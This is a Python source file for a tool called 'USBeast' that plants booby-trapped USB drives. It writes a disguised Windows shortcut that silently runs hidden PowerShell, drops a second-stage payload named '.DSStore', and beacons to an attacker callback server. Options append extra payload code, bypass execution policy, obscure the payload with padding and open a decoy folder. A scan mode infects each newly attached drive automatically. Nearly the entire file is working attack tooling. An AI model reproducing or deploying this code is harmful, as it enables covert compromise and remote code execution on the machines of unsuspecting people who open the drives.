from lib import generator, powershell, script_generator, utils
import logging
import os
import time
import sys
import optparse


def run(target_path, options=None, lnk_name="Images", payload_name=".DSStore", icon=None, token="default", url="", fake_folder=None, pwn=False):
    logger = logging.getLogger('USBeast')
    scripts = script_generator.get_scripts()
    if url == "":
        logger.error("No callback URL was supplied, cannot start")
        sys.exit(0)
    if icon:
        parts = icon.split(',')
        if len(parts) != 2:
            logger.error("Error, Icon should be in format '{path}, {icon number}'\nstopping..")
            return
        icon = parts
        icon[1] = int(icon[1])
    else:
        icon = ["C:\\Windows\\System32\\shell32.dll", int(options.sh32ico) if options and options.sh32ico else 128]

    # ugly code ahead :)
    encode = True if options and options.encode else False
    bypass = True if options and options.use_bypass else False
    full_path = False if options and options.use_relative else True
    create_fake_folder = False if options and options.nocreate_fake_folder else True
    hide_window = False if options and options.no_hide else True
    dont_hide_second_stage_payload = False if options and options.encode else True
    custom_path = options.custom_path if options and options.custom_path else None

    out, parsed, out_var = script_generator.pre_process_output(scripts)
    out = powershell.disable_exception_handler() + out
    if fake_folder:
        logger.debug("Creating fake folder %s" % fake_folder)
        out += generator.fake_folder(fake_folder, target_path, create_fake_folder=create_fake_folder)
    payload = "".join([out, parsed])
    payload += generator.callback_generator(url, token, out_var)
    if pwn:
        evil = generator.append_evil('payloads')
        if len(evil):
            logger.info("Appending %d bytes of evil code from payloads directory" % len(evil))
            payload += evil

    generator.second_stage_payload(os.path.join(target_path, payload_name),
                                   payload,
                                   encode=encode,
                                   hidden_file=dont_hide_second_stage_payload)

    cmd, args = generator.first_stage_payload(payload_name,
                                              hide_window=hide_window,
                                              bypass=bypass,
                                              custom_path=custom_path,
                                              full_path=full_path)
    logger.debug("Command: %s\nArguments: %s" % (cmd, args))
    utils.create_shortcut(lnk_file="%s.lnk" % lnk_name,
                          output_folder=target_path,
                          title=lnk_name,
                          target=cmd,
                          args=args,
                          icon=(icon[0].strip(), icon[1])
                          )
    logger.info("Wrote shortcut to %s with %d bytes of first stage payload" % (lnk_name, len(args)))


def mode_single(options):
    logger = logging.getLogger("single mode")
    output_folder = options.output
    run(output_folder,
        fake_folder=options.fake_folder,
        options=options,
        lnk_name=options.ink_file,
        payload_name=options.payload_file,
        icon=options.icon,
        pwn=options.pwn,
        url=options.server
        )


def mode_scan(options):
    logger = logging.getLogger("scan mode")
    print("Automatic creation mode, "
          "detach the USB drive(s) you are going to use and press any key")
    try:
        input()
    except:
        pass
    blacklist = utils.get_drives()
    seen = []
    logger.info("blacklisted drives: %s" % (', '.join(blacklist)))
    logger.info("Now attach a new USB device and it will be automatically equipped with the exploit code")
    logger.info("Please do not use the same USB port until the drive unplugged message appears")

    while 1:
        try:
            new_drives = utils.get_drives()
            for drive in new_drives:
                if drive not in blacklist:
                    if drive not in seen:
                        logger.info("storage device %s appeared, executing code" % drive)
                        drive_path = "%s\\" % drive
                        run(drive_path,
                            options=options,
                            fake_folder=options.fake_folder,
                            lnk_name=options.ink_file,
                            payload_name=options.payload_file,
                            pwn=options.pwn,
                            icon=options.icon,
                            url=options.server
                            )
                        seen.append(drive)

            for drive_check in seen:
                if drive_check not in new_drives:
                    seen.remove(drive_check)
                    logger.info("re-enabled trigger for %s because drive was unplugged" % drive_check)
            time.sleep(2)
        except KeyboardInterrupt:
            logger.info("KeyboardInterrupt found, quitting")
            break


if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option('-o', '--output', dest="output", default=None,
                      help="Output directory for files, "
                           "if none is set the code will automatically attempt to put the code on new USB devices.")

    parser.add_option("-s", "--server", dest="server",
                      help="The connect back server, can be server.py or any other HTTP(s) server. "
                           "format: http://host{:optional port}/{optional random file / directory name}",
                      default="http://localhost/images/icon.ico")

    parser.add_option("-p", "--pwn", dest="pwn", action="store_true",
                      help="Run additional code after callback is sent, see payloads/readme.txt for more information",
                      default=False)

    parser.add_option('-i', '--icon', dest="icon",
                      help="Icon file, number. Use embedded DLL or EXE file for custom Icons. "
                           "shell32.dll works best in most cases, see misc folder for number references",
                      default=None)
    parser.add_option('--shell32-icon', dest="sh32ico",
                      help="Shell32.dll Icon number",
                      default=None)

    parser.add_option('-f', '--filename', dest="ink_file",
                      help="Name of the shortcut file to create, default: Images", default="Images")

    parser.add_option('--payload-file', dest="payload_file",
                      help="Name of the (hidden) file which contains the actual payload", default=".DSStore")

    parser.add_option('--fake-folder', dest="fake_folder",
                      help="Create a fake folder and open once the code is executed.", default=None)

    parser.add_option('--nocreate-fake-folder', dest="nocreate_fake_folder", action="store_true",
                      help="Don't actually create the fake folder. "
                           "When folder is not found Quick Access is opened in explorer", default=False)

    parser.add_option("--obfuscate", action="store_true", dest="encode",
                      help="Attempt to hide the content of the second stage file by appending a lot of newlines",
                      default=False)

    parser.add_option("-v", dest="verbose", action="store_true",
                      help="Show verbose messages",
                      default=False)

    group = optparse.OptionGroup(parser, "PowerShell options", "PowerShell related configuration")

    group.add_option("--bypass", action="store_true", dest="use_bypass",
                     help="Use ExecutionPolicy: Bypass, allows more advanced features but might trigger AV", default=None)

    group.add_option("--no-hide", action="store_true", dest="no_hide",
                     help="Do not attempt to hide the PowerShell window", default=False)

    group.add_option("--custom-path", dest="custom_path",
                     help="Custom path to powershell.exe, make sure this file exists on the target.",
                     default=None)

    group.add_option("--relative-powershell", dest="use_relative", action="store_true",
                     help="Use powershell.exe without the full path, "
                          "only use if powershell.exe is available in the current directory.")
    parser.add_option_group(group)

    opts, args = parser.parse_args()
    logging.basicConfig(level=logging.DEBUG if opts.verbose else logging.INFO, stream=sys.stdout)
    if opts.output:
        mode_single(opts)
    else:
        mode_scan(opts)

